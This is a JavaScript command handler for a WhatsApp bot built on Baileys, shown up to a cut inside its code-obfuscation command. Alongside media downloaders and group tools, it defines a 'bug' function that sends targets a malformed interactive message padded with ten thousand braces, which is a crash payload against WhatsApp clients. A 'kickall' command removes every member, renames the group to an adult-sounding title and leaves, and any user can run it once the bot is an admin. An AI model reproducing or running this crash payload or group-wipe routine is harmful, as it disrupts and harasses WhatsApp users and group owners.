require("./trashenv")
const { downloadContentFromMessage, proto, generateWAMessage, getContentType, prepareWAMessageMedia, generateWAMessageFromContent, GroupSettingChange, jidDecode, WAGroupMetadata, emitGroupParticipantsUpdate, emitGroupUpdate, generateMessageID, jidNormalizedUser, generateForwardMessageContent, WAGroupInviteMessageGroupMetadata, GroupMetadata, Headers, delay, WA_DEFAULT_EPHEMERAL, WADefault, getAggregateVotesInPollMessage, generateWAMessageContent, areJidsSameUser, useMultiFileAuthState, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaconnet, makeInMemoryStore, MediaType, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, initInMemoryKeyStore, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WAMediaUpload, mentionedJid, processTime, Browser, MessageType,
Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, DisconnectReason, WAconnet, getStream, WAProto, isBaileys, AnyMessageContent, templateMessage, InteractiveMessage, Header } = require("@whiskeysockets/baileys")
///package depedencies///////////////
const os = require('os')
const fs = require('fs')
const fg = require('api-dylux')
const fetch = require('node-fetch');
const axios = require('axios')
const { exec, execSync } = require("child_process")
const chalk = require('chalk')
const nou = require('node-os-utils')
const moment = require('moment-timezone');
const path = require ('path');
const didyoumean = require('didyoumean');
const similarity = require('similarity');
const speed = require('performance-now')
const { Sticker } = require('wa-sticker-formatter');
const { igdl } = require("btch-downloader");
const yts = require ('yt-search');
///////////scrapes/////////////////////////////
const { 
	CatBox, 
	fileIO, 
	pomfCDN, 
	uploadFile
} = require('./library/scrapes/uploader');
///////////database access/////////////////
const { addPremiumUser, delPremiumUser } = require("./library/lib/premiun");
/////////exports////////////////////////////////
module.exports = async (trashcore, m) => {
try {
const from = m.key.remoteJid
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
//////////Libraryfunction///////////////////////
const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, tanggal, getRandom } = require('./library/lib/function')
// Main Setting (Admin And Prefix )///////
const budy = (typeof m.text === 'string') ? m.text : '';
const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.key.fromMe ? (trashcore.user.id.split(':')[0]+'@s.whatsapp.net' || trashcore.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = trashcore.user.id.split(':')[0];
const senderNumber = sender.split('@')[0]
const trashown = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
    const premuser = JSON.parse(fs.readFileSync("./library/database/premium.json"));
const isNumber = x => typeof x === 'number' && !isNaN(x)
const formatJid = num => num.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
const isPremium = trashown || premuser.map(u => formatJid(u.id)).includes(m.sender);
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const groupMetadata = m.isGroup ? await trashcore.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
/////////////Setting Console//////////////////
console.log(chalk.black(chalk.bgWhite(!command ? '[ MESSAGE ]' : '[ COMMAND ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
/////////quoted functions//////////////////
const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `🩸⃟‣𝐓𝐑𝐀𝐒𝐇𝐂𝐎𝐑𝐄-𝐂𝐋𝐈𝐄𝐍𝐓≈🚭`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://files.catbox.moe/yqbio5.jpg' }}}}
const setting = db.data.settings[botNumber]
        if (typeof setting !== 'object') db.data.settings[botNumber] = {}
	    if (setting) {
//    	    if (!('anticall' in setting)) setting.anticall = false
    		if (!isNumber(setting.status)) setting.status = 0
    		if (!('autobio' in setting)) setting.autobio = false
            if (!('autoread' in setting)) setting.autoread = false
            if (!('autoTyping' in setting)) setting.autoTyping = false
            if (!('autoRecord' in setting)) setting.autoRecord = false
//        if (!('goodbye' in setting)) chats.goodbye = setting.auto_leaveMsg
//        if (!('welcome' in setting)) chats.welcome = setting.auto_welcomeMsg
       if (!('onlygrub' in setting)) setting.onlygrub = false
	  } else db.data.settings[botNumber] = {
   	  anticall: false,
    		status: 0,
    		stock:10,
    		autobio: false,
    		autoTyping: true,
   		auto_ai_grup: false,
   		goodbye: false,
    		onlygrub: false,
       welcome: true, 
    		autoread: false,
    		menuType: 'externalImage' //> buttonImage
	    }



if (!m.key.fromMe && db.data.settings[botNumber].autoread){
const readkey = {
remoteJid: m.chat,
id: m.key.id, 
participant: m.isGroup ? m.key.participant : undefined 
}
await trashcore.readMessages([readkey]);
}
trashcore.sendPresenceUpdate('available', m.chat)
if (db.data.settings[botNumber].autoTyping) {
if (m.message) {
trashcore.sendPresenceUpdate('composing', m.chat)
}
}
if (db.data.settings[botNumber].autoRecord) {
if (m.message) {
trashcore.sendPresenceUpdate('recording', m.chat)
}
}
if (db.data.settings[botNumber].autobio) {
let setting = db.data.settings[botNumber]
if (new Date() * 1 - setting.status > 1000) {
let uptime = await runtime(process.uptime())
await trashcore.updateProfileStatus(`✳️ Silencer brutality || ✅ Runtime : ${uptime}`)
setting.status = new Date() * 1
}
}

const lol = {
  key: {
    fromMe: false,
    participant: "13135550002@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnailUrl: "https://files.catbox.moe/tq6zy6.jpg",
      itemCount: "999999",
      status: "INQUIRY",
      surface: "CATALOG",
      Runtime : "${runtime(process.uptime())}",
      message: `Sender : @${m.sender.split('@')[0]}\n愛とは何か？ `,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["13135550002@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}

      

    
const mdmodes = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "13135559098@s.whatsapp.net"
} : {}),
id: `${Date.now()}-${Math.random().toString(36).slice(2)}`
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: 'USD',
amount1000: 999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: `𝐒𝐈𝐋𝐄𝐍𝐂𝐄𝐑-𝐁𝐎𝐓`
}
},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: 'INR'
}
}
},
status: 1,
  participant: "0@s.whatsapp.net"
}
const qtext = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: "Tennor-modz" }}}

////////////////Reply Message////////////////
const replypic = fs.readFileSync('./library/media/connect.jpg');

async function reply(teks) {
trashcore.sendMessage(m.chat, {
text: teks,
contextInfo: {
forwardingScore: 9,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363322464215140@newsletter",
newsletterName: "🩸⃟‣𝐓𝐑𝐀𝐒𝐇𝐂𝐎𝐑𝐄-𝐂𝐋𝐈𝐄𝐍𝐓≈🚭" 
}
}
}, {
quoted: fkontak
})
}

const trashreply = (teks) => {
trashcore.sendMessage(from, { text : teks }, { quoted : fkontak })
}
const trashpic = fs.readFileSync('./library/media/porno.jpg');
async function replymenu(teks) {
trashcore.sendMessage(m.chat, {
image:trashpic,  
caption: teks,
sourceUrl: 'https://github.com/Tennor-modz',    
contextInfo: {
forwardingScore: 9,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363418618707597@newsletter",
newsletterName: "🩸⃟‣𝐓𝐑𝐀𝐒𝐇𝐂𝐎𝐑𝐄-𝐂𝐋𝐈𝐄𝐍𝐓≈🚭"
}
}
}, {
quoted: fkontak
})
}
 //////////React message///////////////
    const reaction = async (jidss, emoji) => {
    trashcore.sendMessage(jidss, {
        react: { text: emoji,
                key: m.key 
               } 
            }
        );
    };
 /////////function set presence/////
                   if (global.autoRecording) {
        trashcore.sendPresenceUpdate('recording', from)
        }      
      if (global.autoTyping) {
        trashcore.sendPresenceUpdate('composing', from)
        }
        if (global.autorecordtype) {
        let trashrecord = ['recording','composing']
        let xeonrecordinfinal = trashrecord[Math.floor(Math.random() * trashrecord.length)]
        trashcore.sendPresenceUpdate(xeonrecordinfinal, from)

        }
if (m.isGroup) {
    if (body.includes(`@254104245659`)) {
        reaction(m.chat, "❓")
    }
 }
///////////////Similarity///////////////////////
function getCaseNames() {
  try {
    const data = fs.readFileSync('./trashhandler.js', 'utf8');
    const casePattern = /case\s+'([^']+)'/g;
    const matches = data.match(casePattern);

    if (matches) {
      return matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
    } else {
      return [];
    }
  } catch (error) {
    console.error('error occurred:', error);
    throw error;
  }
}

/////////////fetch commands///////////////
let totalfeature= () =>{
var mytext = fs.readFileSync("./trashhandler.js").toString()
var numUpper = (mytext.match(/case '/g) || []).length;
return numUpper
        }
////////////tag owner reaction//////////////
if (m.isGroup) {
    if (body.includes(`@${owner}`)) {
        reaction(m.chat, "❌")
    }
 }
/////////////test bot no prefix///////////////
if ((budy.match) && ["bot",].includes(budy) && !isCmd) {
reply(`bot is always online ✅`)
}	
///////////example///////////////////////////
////////bug func/////////////////////
    async function trashdebug(target) {
let msg = await generateWAMessageFromContent(
target, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: "",
hasMediaAttachment: false,
},
body: {
text: "𝐓𝐑𝐀𝐒𝐡𝐜𝐨𝐫𝐞 -𝐄𝐗𝐏𝐥𝐨𝐫𝐚𝐭𝐢𝐨𝐧 ",
},
nativeFlowMessage: {
messageParamsJson: "{".repeat(10000),
buttons: [{
name: "single_select",
},
{
name: "call_permission_request",
buttonParamsJson: "",
},
],
},
},
},
},
}, {}
);

await trashcore.relayMessage(target, msg.message, {
messageId: msg.key.id,
participant: {
jid: target
},
});
}


    
///////////end bug func///////////
const example = (teks) => {
return `\n *invalid format!*\n`
}

/////////////plugins commands/////////////
const menu = require('./library/listmenu/menulist');
const pluginsLoader = async (directory) => {
let plugins = []
const folders = fs.readdirSync(directory)
folders.forEach(file => {
const filePath = path.join(directory, file)
if (filePath.endsWith(".js")) {
try {
const resolvedPath = require.resolve(filePath);
if (require.cache[resolvedPath]) {
delete require.cache[resolvedPath]
}
const plugin = require(filePath)
plugins.push(plugin)
} catch (error) {
console.log(`Error loading plugin at ${filePath}:`, error)
}}
})
return plugins
}
//========= [ COMMANDS PLUGINS ] =================================================
let pluginsDisable = true
const plugins = await pluginsLoader(path.resolve(__dirname, "trashplugs"))
const trashdex = { trashown, reply,replymenu,command,isCmd, text, botNumber, prefix, reply,fetchJson,example, totalfeature,trashcore,m,q,mime,sleep,fkontak,menu,addPremiumUser, args,delPremiumUser,isPremium,trashpic,trashdebug,sleep,isAdmins,groupAdmins,isBotAdmins,quoted,from,groupMetadata,downloadAndSaveMediaMessage}
for (let plugin of plugins) {
if (plugin.command.find(e => e == command.toLowerCase())) {
pluginsDisable = false
if (typeof plugin !== "function") return
await plugin(m, trashdex)
}
}
if (!pluginsDisable) return
switch (command) {

//==================================================//      
case 'autotyping':
if (!trashown) return reply(mess.owner)
if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
if (q == 'on') {
db.data.settings[botNumber].autoTyping = true
reply(`Successfully Changed Auto Typing To ${q}`)
} else if (q == 'off') {
db.data.settings[botNumber].autoTyping = false
reply(`Successfully Changed Auto Typing To ${q}`)
}
break
//==================================================//      
        case 'autorecord':
if (!trashown) return reply(mess.owner)
if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
if (q == 'on') {
db.data.settings[botNumber].autoRecord = true
reply(`Successfully Changed Auto Record To ${q}`)
} else if (q == 'off') {
db.data.settings[botNumber].autoRecord = false
reply(`Successfully Changed Auto Record To ${q}`)
}
break;
//==================================================//      
        case 'autobio':
if (!trashown) return reply(mess.owner)
if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
if (q == 'on') {
db.data.settings[botNumber].autobio = true
reply(`Successfully Changed Auto Bio To ${q}`)
} else if (q == 'off') {
db.data.settings[botNumber].autobio = false
reply(`Successfully Changed Auto Bio To ${q}`)
}
break
//==================================================//
case "dev":
case "devoloper":
case "owner":
case "xowner": {
  let namaown = `TRASHCoreϟ`
  let NoOwn = `254788460896`
  var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
    contactMessage: {
      displayName: namaown,
      vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${NoOwn}:+${NoOwn}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:The Nasty Dev🐉\nX-WA-BIZ-NAME:[[ ༑ 𝐙.𝐱.𝐕 ⿻ 𝐏𝐔𝐁𝐋𝐢𝐂 ༑ ]]\nEND:VCARD`
    }
  }), {
    userJid: m.chat,
    quoted: fkontak
  })
  trashcore.relayMessage(m.chat, contact.message, {
    messageId: contact.key.id
  })
}
break;
//==================================================//
case "invite": case "linkgc": { 
                 if (!m.isGroup) return reply(mess.group); 
                 if (!isBotAdmins) return reply("bot must be admin in group"); 
                 let response = await trashcore.groupInviteCode(m.chat); 
                 trashcore.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup link for  ${groupMetadata.subject}`, m, { detectLink: true }); 
             } 
          break;
//==================================================//
case "close": {
if (!isGroup) return reply(mess.group)
if (!isBotAdmins) return reply("bot must be admin first")
if (!trashown) return reply(mess.owner)
await trashcore.groupSettingUpdate(m.chat, 'announcement')
reply("Success closed group chat,all members are not allowed to chat for now")
}
break
//==================================================//
case "open": {
if (!isGroup) return reply(mess.group)
if (!isBotAdmins) return reply("bot must be admin first")
if (!trashown) return reply(mess.owner)
await trashcore.groupSettingUpdate(m.chat, 'not_announcement')
reply("Success opened group chat,all members can send messages in group now")
}
break
//==================================================//
case 'tagall': {
if (!isGroup) return reply(mess.group)
if (!trashown) return reply(mess.owner)
if (!text) return reply("fuck you")
trashcore.sendMessage(m.chat, {
text: "@" + m.chat,
contextInfo: {
mentionedJid: (await (await trashcore.groupMetadata(m.chat)).participants).map(a => a.id),
groupMentions: [
{
groupJid: m.chat,
groupSubject: text
}
]
}
}, {
quoted: m
})
}
break
//==================================================//
case 'h':
case 'hidetag': {
if (!isGroup) return reply(mess.group)
if (!trashown) return reply(mess.owner)
if (m.quoted) {
trashcore.sendMessage(m.chat, {
forward: m.quoted.fakeObj,
mentions: participants.map(a => a.id)
})
}
if (!m.quoted) {
trashcore.sendMessage(m.chat, {
text: q ? q : '',
mentions: participants.map(a => a.id)
}, {
quoted: m
})
}
}
break
//==================================================//
case 'kick': {
if (!isGroup) return reply(mess.group)
if (!isBotAdmins) return reply("bot must be admin first")
if (!trashown) return reply(mess.owner)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await trashcore.groupParticipantsUpdate(m.chat, [users], 'remove')
reply(`Sukses kick @${users.split('@')[0]}`)
}
break
//==================================================//
case "kill": 
case "kickall": {
	  if (!m.isGroup) return reply(mess.group)          
 if (!isBotAdmins) return reply(`bot is not admin in the group`)
          let raveni = participants.filter(_0x5202af => _0x5202af.id != trashcore.decodeJid(trashcore.user.id)).map(_0x3c0c18 => _0x3c0c18.id);
		      
          reply("Initializing Kill command💀...");
      
      await trashcore.removeProfilePicture(m.chat);
      await trashcore.groupUpdateSubject(m.chat, "Xxx Videos Hub");
      await trashcore.groupUpdateDescription(m.chat, "//This group is no longer available 🥹!");
      
	
          setTimeout(() => {
            trashcore.sendMessage(m.chat, {
              'text': "All parameters are configured, and Kill command has been initialized and confirmed✅️. Now, all " + raveni.length + " group participants will be removed in the next second.\n\nGoodbye Everyone 👋\n\nTHIS PROCESS IS IRREVERSIBLE ⚠️"
            }, {
              'quoted': m
            });
            setTimeout(() => {
              trashcore.groupParticipantsUpdate(m.chat, raveni, "remove");
              setTimeout(() => {
                reply("Succesfully removed All group participants✅️.\n\nGoodbye group owner 👋, its too cold in here 🥶.");
trashcore.groupLeave(m.chat);	      
              }, 1000);
            }, 1000);
          }, 1000);
        };	      
          break;
//==================================================//
case "promote": case "promot": {
if (!isGroup) return reply(`for group only`)
if (!isAdmins && !trashown) return m.reply(`Command reserved for group admins only`)
if (!isBotAdmins) return reply(`bot is not an admin idiot`)
if (m.quoted || text) {
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await trashcore.groupParticipantsUpdate(m.chat, [target], 'promote').then((res) => reply(`User ${target.split("@")[0]} is now an admin`)).catch((err) => reply(err.toString()))
} else return reply('Example: 254XXX/@tag')}
break
//==================================================//
case "demote": case "dismiss": {
if (!isGroup) return reply(mess.group)
if (!isAdmins && !trashown) return m.reply(mess.admin)
if (!isBotAdmins) return reply(`bot is not an admin in this group`)
if (m.quoted || text) {
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await trashcore.groupParticipantsUpdate(m.chat, [target], 'demote').then((res) => reply(`Member ${target.split("@")[0]} is no longer an admin in this group`)).catch((err) => reply(err.toString()))
} else return reply('example:254XX')}
break
//==================================================//
case "close": {
if (!isGroup) return reply(mess.group)
if (!isBotAdmins) return reply("bot must be admin first")
if (!trashown) return reply(mess.owner)
await trashcore.groupSettingUpdate(m.chat, 'announcement')
reply("Success closed group chat,all members are not allowed to chat for now")
}
break
//==================================================//
case "open": {
if (!isGroup) return reply(mess.group)
if (!isBotAdmins) return reply("bot must be admin first")
if (!trashown) return reply(mess.owner)
await trashcore.groupSettingUpdate(m.chat, 'not_announcement')
reply("Success opened group chat,all members can send messages in group now")
}
break
//==================================================//
case 'song': {
  if (!text) return reply('provide a song title lagu!\nExample: *play ransoms*');

  try {
    let res = await fetch(`https://ochinpo-helper.hf.space/yt?query=${encodeURIComponent(text)}`);
    if (!res.ok) throw new Error('API not found');
    let json = await res.json();
    if (!json.success || !json.result) throw new Error('an api error occured');
    const {
      title,
      url,
      image,
      duration,
      author,
      download
    } = json.result;
    const thumbnail = await (await fetch(image)).buffer();
    await trashcore.sendMessage(m.chat, {
      audio: { url: download.audio },
      mimetype: 'audio/mpeg',
      fileName: `${title}.mp3`,
      ptt: true,
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          title,
          body: `${author.name} • ${duration.timestamp}`,
          thumbnail,
          mediaUrl: url,
          mediaType: 2,
          renderLargerThumbnail: true,
          sourceUrl: url
        }
      }
    }, { quoted: m });
  } catch (e) {
    console.warn('Fallback to Nekorinn API:', e.message);
    try {
      let res = await fetch(`https://api.nekorinn.my.id/downloader/ytplay-savetube?q=${encodeURIComponent(text)}`);
      let data = await res.json();
      if (!data.status || !data.result) throw new Error('Respon cadangan 1 tidak valid');
      const { title, channel, duration, imageUrl, link } = data.result.metadata;
      const downloadUrl = data.result.downloadUrl;
      const thumbnail = await (await fetch(imageUrl)).buffer();
     await reply(`wise Al is downloading song ${title} by author`);    
      await trashcore.sendMessage(m.chat, {
        audio: { url: downloadUrl },
        mimetype: 'audio/mpeg',
        fileName: `${title}.mp3`,
        ptt: true,
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          externalAdReply: {
            title,
            body: `${channel} • ${duration}`,
            thumbnail,
            mediaUrl: link,
            mediaType: 2,
            renderLargerThumbnail: true,
            sourceUrl: link
          }
        }
      }, { quoted: m });
    } catch (err) {
      console.warn('Fallback to Diioffc API:', err.message);
      try {
        const res2 = await fetch(`https://api.diioffc.web.id/api/search/ytplay?query=${encodeURIComponent(text)}`);
        if (!res2.ok) return ReplyMultiMenu2('unable to get song data.');
        const json = await res2.json();
        if (!json.status || !json.result) return ReplyMultiMenu2('title must be valid!');
        const { title, author, duration, thumbnail: thumb, url, download } = json.result;
        const thumbnail = await (await fetch(thumb)).buffer();

        await trashcore.sendMessage(m.chat, {
          audio: { url: download.url },
          mimetype: 'audio/mpeg',
          fileName: download.filename || `${title}.mp3`,
          ptt: true,
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            externalAdReply: {
              title,
              body: `${author.name} • ${duration.timestamp}`,
              thumbnail,
              mediaUrl: url,
              mediaType: 2,
              renderLargerThumbnail: true,
              sourceUrl: url
            }
          }
        }, { quoted: m });
      } catch (finalErr) {
        console.error(finalErr);
        reply('an error has occurred while processing your request.');
      }
    }
  }
}
break
//==================================================//     
        case "play":{
                if (!text) return reply(`\n*ex:* ${prefix + command} impossible\n`)
           
    let res = await fetch(`https://ochinpo-helper.hf.space/yt?query=${encodeURIComponent(text)}`);
    if (!res.ok) throw new Error('API not found');
  let json = await res.json();
    if (!json.success || !json.result) throw new Error('an api error occured');         
  const {
      title,
      url,
      image,
      duration,
      author,
      download
    } = json.result;            
               await reply(`downloading song ${title}`);
                let mbut = await fetchJson(`https://ochinpo-helper.hf.space/yt?query=${text}`)
                let ahh = mbut.result
                let crot = ahh.download.audio

                trashcore.sendMessage(m.chat, {
                    audio: { url: crot },
                    mimetype: "audio/mpeg", 
                    ptt: true
                }, { quoted: fkontak })
            }
            break
//==================================================//
case 'fb': case 'facebook': case 'fbdl':
case 'ig': case 'instagram': case 'igdl': {
 if (!args[0]) return reply("🔗 provide a fb or ig link!");
 try {
 const axios = require('axios');
 const cheerio = require('cheerio');
 async function yt5sIo(url) {
 try {
 const form = new URLSearchParams();
 form.append("q", url);
 form.append("vt", "home");
 const { data } = await axios.post('https://yt5s.io/api/ajaxSearch', form, {
 headers: {
 "Accept": "application/json",
 "X-Requested-With": "XMLHttpRequest",
 "Content-Type": "application/x-www-form-urlencoded",
 },
 });
 if (data.status !== "ok") throw new Error("provide a valid link.");
 const $ = cheerio.load(data.data); 
 if (/^(https?:\/\/)?(www\.)?(facebook\.com|fb\.watch)\/.+/i.test(url)) {
 const thumb = $('img').attr("src");
 let links = [];
 $('table tbody tr').each((_, el) => {
 const quality = $(el).find('.video-quality').text().trim();
 const link = $(el).find('a.download-link-fb').attr("href");
 if (quality && link) links.push({ quality, link });
 });
 if (links.length > 0) {
 return { platform: "facebook", type: "video", thumb, media: links[0].link };
 } else if (thumb) {
 return { platform: "facebook", type: "image", media: thumb };
 } else {
 throw new Error("media is invalid.");
 }
 } else if (/^(https?:\/\/)?(www\.)?(instagram\.com\/(p|reel)\/).+/i.test(url)) {
 const video = $('a[title="Download Video"]').attr("href");
 const image = $('img').attr("src");
 if (video) {
 return { platform: "instagram", type: "video", media: video };
 } else if (image) {
 return { platform: "instagram", type: "image", media: image };
 } else {
 throw new Error("Media invalid.");
 }
 } else {
 throw new Error("provide a valid url or link.");
 }
 } catch (error) {
 return { error: error.message };
 }
 }
 await trashcore.sendMessage(m.chat, {
 react: {
 text: "⏳",
 key: m.key,
 }
 });
 let res = await yt5sIo(args[0]);
 if (res.error) {
 await trashcore.sendMessage(m.chat, {
 react: {
 text: "❌",
 key: m.key,
 }
 });
 return reply(`⚠ *Error:* ${res.error}`);
 }
 if (res.type === "video") {
 await trashcore.sendMessage(m.chat, {
 react: {
 text: "⏳",
 key: m.key,
 }
 });
 await trashcore.sendMessage(m.chat, { video: { url: res.media }, caption: "✅ *Downloaded by Silencer media Team!*" }, { quoted: m });
 } else if (res.type === "image") {
 await trashcore.sendMessage(m.chat, {
 react: {
 text: "⏳",
 key: m.key,
 }
 });
 await trashcore.sendMessage(m.chat, { image: { url: res.media }, caption: "✅ *Downloaded photo by silencer media team!*" }, { quoted: m });
 }
 } catch (error) {
 console.error(error);
 await trashcore.sendMessage(m.chat, {
 react: {
 text: "❌",
 key: m.key,
 }
 });
 reply("failed to get media.");
 }
}
break
//==================================================//
case 'tiktok': {
if (!text) return reply(`Use : ${prefix + command} link`)
// wait message
trashreply(mess.wait)
let data = await fg.tiktok(text)
let json = data.result
let caption = `[ TIKTOK - DOWNLOAD ]\n\n`
caption += `◦ *Id* : ${json.id}\n`
caption += `◦ *Username* : ${json.author.nickname}\n`
caption += `◦ *Title* : ${(json.title)}\n`
caption += `◦ *Like* : ${(json.digg_count)}\n`
caption += `◦ *Comments* : ${(json.comment_count)}\n`
caption += `◦ *Share* : ${(json.share_count)}\n`
caption += `◦ *Play* : ${(json.play_count)}\n`
caption += `◦ *Created* : ${json.create_time}\n`
caption += `◦ *Size* : ${json.size}\n`
caption += `◦ *Duration* : ${json.duration}`
if (json.images) {
json.images.forEach(async (k) => {
await trashcore.sendMessage(m.chat, { image: { url: k }}, { quoted: m });
})
} else {
trashcore.sendMessage(m.chat, { video: { url: json.play }, mimetype: 'video/mp4', caption: caption }, { quoted: m })
setTimeout(() => {
trashcore.sendMessage(m.chat, { audio: { url: json.music }, mimetype: 'audio/mpeg' }, { quoted: m })
}, 3000)
}
}
break
case 'idch': case 'cekidch': {
if (!text) return reply("channel link?")
if (!text.includes("https://whatsapp.com/channel/")) return reply("Link must be valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await trashcore.newsletterMetadata("invite", result)
let teks = `* *ID : ${res.id}*
* *Name :* ${res.name}
* *Total Followers :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}`
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: { "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 },
interactiveMessage: {
body: {
text: teks }, 
footer: {
text: "𝗕𝗮𝘀𝗲-𝗕𝗼𝘁𝘀-𝗩2" }, //input watermark footer
  nativeFlowMessage: {
  buttons: [
             {
        "name": "cta_copy",
        "buttonParamsJson": `{"display_text": "copy ID","copy_code": "${res.id}"}`
           },
     ], },},
    }, }, },{ quoted : fkontak });
await trashcore.relayMessage( msg.key.remoteJid,msg.message,{ messageId: msg.key.id }
);
}
break
//==================================================//
case 'enc':
case 'encrypt': {
const JsConfuser = require('js-confuser')

if (!m.message.extendedTextMessage || !m.message.extendedTextMessage.contextInfo.quotedMessage) {
return reply('❌ Please Reply File To Be Encryption.');
}
const quotedMessage = m.message.extendedTextMessage.contextInfo.quotedMessage;
const quotedDocument = quotedMessage.documentMessage;
if (!quotedDocument || !quotedDocument.fileName.endsWith('.js')) {
return reply('❌ Please Reply File To Be Encryption.');
}
try {
const fileName = quotedDocument.fileName;
const docBuffer = await m.quoted.download();
if (!docBuffer) {
return reply('❌ Please Reply File To Be Encryption.');
}
await trashcore.sendMessage(m.chat, {
 react: { text: '🕛', key: m.key }
 });
const obfuscatedCode = await JsConfuser.obfuscate(docBuffer.toString(), {
target: "node",
preset: "high",
compact: true,
minify: true,
flatten: true,
identifierGenerator: function () {
const originalString = "素GIDDY晴TENNOR晴" + "素GIDDY晴TENNOR晴";
const removeUnwantedChars = (input) => input.replace(/[^a-zA-Z素GIDDY晴TENNOR晴]/g, "");
const randomString = (length) => {
let result = "";
const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
for (let i = 0; i < length; i++) {
result += characters.charAt(Math.floor(Math.random() * characters.length));
}
return result;
};
return removeUnwantedChars(originalString) + randomString(2);
},
renameVariables: true,
renameGlobals: true,
stringEncoding: true,
stringSplitting: 0.0,
stringConcealing: true,
stringCompression: true,
